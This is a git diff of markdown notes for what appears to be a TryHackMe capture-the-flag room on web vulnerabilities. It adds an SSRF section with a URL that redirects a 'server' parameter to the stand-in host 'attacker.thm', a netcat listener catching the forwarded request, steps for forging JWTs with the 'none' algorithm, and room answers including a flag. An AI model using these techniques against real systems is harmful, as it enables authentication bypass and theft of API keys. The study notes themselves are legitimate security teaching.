@@ -290,7 +290,7 @@ sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=
     * the **Signature** uses a secret key held only by the server which is how this is possible
     * The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways
 
-![imagme](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png)
+![image](https://github.com/user-attachments/assets/e1aa708a-24f1-478a-9c5c-56c04d469f31)
 
 
 ### JWT & the None Algorithm 
@@ -298,7 +298,7 @@ sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=
   1. modify the header section of the token so that the ```alg``` header would contain the value ```none```
   2. remove the signature part completely
 
-![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png)
+![image](https://github.com/user-attachments/assets/a1b6ddcb-1283-4f54-978c-6eb0366abdcf)
 
 #### What is the guest's account password?
 ```
@@ -360,30 +360,35 @@ Brute Force
 * this type of vulnerability occurs when an attacker can coerce a web application into sending request on their behalf to arbitrary destinations while having control of the contents of the request itself
 * arise from implementations where out web applicatoin needs to user third-party services
 
-![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png)
+![image](https://github.com/user-attachments/assets/7f64e545-963d-4a54-ada7-bad3d28453ad)
 
+* in the above illustration, the application exposes the ```server``` parameter to the user which defines the server name of the SMS service provider
+* an attacker could potentially change this value to whatever they wanted so that the SMS request was forwarded to themselves
+```
+https://www.mysite.com/sms?server=attacker.thm&msg=ABc
+```
+* this request could then be directed to a netcat
+```
+user@attackbox$ nc -lvp 80
+Listening on 0.0.0.0 80
+Connection received on 10.10.1.236 43830
+GET /:8087/public-docs/123.pdf HTTP/1.1
+Host: 10.10.10.11
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: */*
 ```
 
+#### What is the only host allowed to access teh admin area?
 ```
+localhost
 ```
 
+#### Check the "Download Resume" button, where does the server parameter point to?
+```
+secure-file-storage.com
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+#### Using SSRF, make the application send the request to your AttackBox instead, are there any API keys in the intercepted request?
+```
+THM{Hello_Im_just_an_API_key}
+```
